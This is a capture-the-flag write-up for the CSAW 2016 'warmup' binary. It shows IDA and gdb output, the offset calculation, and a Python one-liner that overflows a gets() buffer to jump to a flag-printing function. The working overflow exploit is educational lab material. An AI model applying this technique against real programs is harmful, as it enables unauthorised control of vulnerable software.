So when we drop the x64 bit elf into IDA and reverse the main function, we get the following code:
```
  char char0; // [sp+0h] [bp-80h]@1
  char target_char; // [sp+40h] [bp-40h]@1

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(&char0, "%p\n", 4195853LL);
  write(1, &char0, 9uLL);
  write(1, ">", 1uLL);
  return gets(&target_char, 4196181LL);
```

As we can see, essentially prints out the `char0` pointer, then uses a gets call to `target_char` which we should be able to exploit. We can also see a different functionc alled `easy` which will be of importance to us, and when we reverse the assembly code we get this:

```
int easy()
{
  return system("cat flag.txt");
}
```

So we can see that the easy function prints the flag. Let's take a look to see what binary hardening measures are in place:

```
$	checksec warmup 
[*] '/Hackery/ctf/csaw/warmup/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that it only has partial RELRO so there shouldn't be anything stopping a buffer overflow. So we should be able to use the insecure `gets` call in the main function to run the `easy` function, which should print the flag. Let's switch over to gdb to figure out how to do it.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000040061d <+0>:	push   rbp
   0x000000000040061e <+1>:	mov    rbp,rsp
   0x0000000000400621 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:	mov    edx,0xa
   0x000000000040062a <+13>:	mov    esi,0x400741
   0x000000000040062f <+18>:	mov    edi,0x1
   0x0000000000400634 <+23>:	call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:	mov    edx,0x4
   0x000000000040063e <+33>:	mov    esi,0x40074c
   0x0000000000400643 <+38>:	mov    edi,0x1
   0x0000000000400648 <+43>:	call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:	lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:	mov    edx,0x40060d
   0x0000000000400656 <+57>:	mov    esi,0x400751
   0x000000000040065b <+62>:	mov    rdi,rax
   0x000000000040065e <+65>:	mov    eax,0x0
   0x0000000000400663 <+70>:	call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:	lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:	mov    edx,0x9
   0x0000000000400671 <+84>:	mov    rsi,rax
   0x0000000000400674 <+87>:	mov    edi,0x1
   0x0000000000400679 <+92>:	call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:	mov    edx,0x1
   0x0000000000400683 <+102>:	mov    esi,0x400755
   0x0000000000400688 <+107>:	mov    edi,0x1
   0x000000000040068d <+112>:	call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:	lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:	mov    rdi,rax
   0x0000000000400699 <+124>:	mov    eax,0x0
   0x000000000040069e <+129>:	call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:	leave  
   0x00000000004006a4 <+135>:	ret    
End of assembler dump.
gdb-peda$ b *main+129
Breakpoint 1 at 0x40069e
gdb-peda$ r
Starting program: /Hackery/ctf/csaw/warmup/warmup 
-Warm Up-
WOW:0x40060d
```

And when we hit the breakpoint:

```
Breakpoint 1, 0x000000000040069e in main ()
gdb-peda$ x/x $rbp-0x40
0x7fffffffddd0:	0x0000000000000001
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde20:
 rip = 0x40069e in main; saved rip = 0x7ffff7a2e830
 called by frame at 0x7fffffffdee0
 Arglist at 0x7fffffffde10, args: 
 Locals at 0x7fffffffde10, Previous frame's sp is 0x7fffffffde20
 Saved registers:
  rbp at 0x7fffffffde10, rip at 0x7fffffffde18
```

Using python let's calculate the difference between the location of the start of our input (`rbp-0x40`) and the `rip` register:
```
>>> 0x7fffffffde18 - 0x7fffffffddd0
72
```

So we can see that we should only need to input 72 characters before we reach the `rip` register. Let's see what the address of the `easy` function is, so we can push it onto the `rip` register.

```
gdb-peda$ p easy
$1 = {<text variable, no debug info>} 0x40060d <easy>
```

So we can see that the function we need to jump to is at 0x40060d. We can write a python one liner to execute thee exploit.

```
python -c 'print "0"*72 + "\x0d\x06\x40\x00\x00\x00\x00\x00"' | ./warmup 
-Warm Up-
WOW:0x40060d
>FLAG{LET_US_BEGIN_CSAW2016}
Segmentation fault (core dumped)
```

Just like that, we got the flag.